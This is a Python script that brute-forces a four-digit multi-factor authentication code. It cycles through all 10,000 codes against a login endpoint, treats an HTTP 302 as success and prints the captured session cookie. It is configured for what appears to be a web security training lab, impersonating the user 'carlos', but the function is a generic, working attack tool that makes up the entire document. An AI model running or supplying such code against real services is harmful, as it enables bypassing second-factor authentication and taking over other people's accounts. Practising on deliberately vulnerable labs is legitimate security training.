import requests

def brute_force_mfa(burp_request, mfa_code_position):
    """
    This function performs brute-force attacks based on the given Burp Suite request.
    :param burp_request: A dictionary representing the Burp request data.
    :param mfa_code_position: The placeholder string in the request where the brute-force payload will be inserted.
    """
    
    # Parse the Burp request
    url = burp_request['url']
    headers = burp_request['headers']
    data_template = burp_request['data']
    
    # Get the total number of possible combinations (0000-9999)
    total_attempts = 10000
    success_status = 302  # Look for 302 status code for successful login

    # Start brute-forcing
    for code in range(total_attempts):
        # Format the brute-force code to be four digits (e.g., 0000, 0001, ..., 9999)
        mfa_code = f"{code:04d}"
        
        # Replace the placeholder with the actual brute-force code in the request
        data = data_template.replace(mfa_code_position, mfa_code)
        
        # Send the HTTP POST request
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        
        # Display the progress
        print(f"Attempt {code + 1}/{total_attempts} - Trying MFA Code: {mfa_code} - Status Code: {response.status_code}")
        
        # Check for success status
        if response.status_code == success_status:
            print(f"Success! MFA Code {mfa_code} resulted in a 302 status code.")
            # Extract the session cookie (if available)
            session_cookie = response.cookies.get_dict()
            print(f"Session Cookie: {session_cookie}")
            break
    else:
        print("Brute-force attack completed without finding a valid MFA code.")

if __name__ == "__main__":
    # Example Burp request configuration
    burp_request = {
        "url": "https://0a68004b0452892080b8628a00b2002a.web-security-academy.net/login2",
        "headers": {
            "Host": "0a68004b0452892080b8628a00b2002a.web-security-academy.net",
            "Cookie": "verify=carlos",
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Linux"',
            "Origin": "https://0a68004b0452892080b8628a00b2002a.web-security-academy.net",
            "Dnt": "1",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://0a68004b0452892080b8628a00b2002a.web-security-academy.net/login2",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
            "Priority": "u=0, i",
            "Connection": "keep-alive"
        },
        # The request body where "{mfa_code}" is the placeholder for the brute-force payload
        "data": "mfa-code={mfa_code}"
    }
    
    # Run the brute-force script
    brute_force_mfa(burp_request, "{mfa_code}")
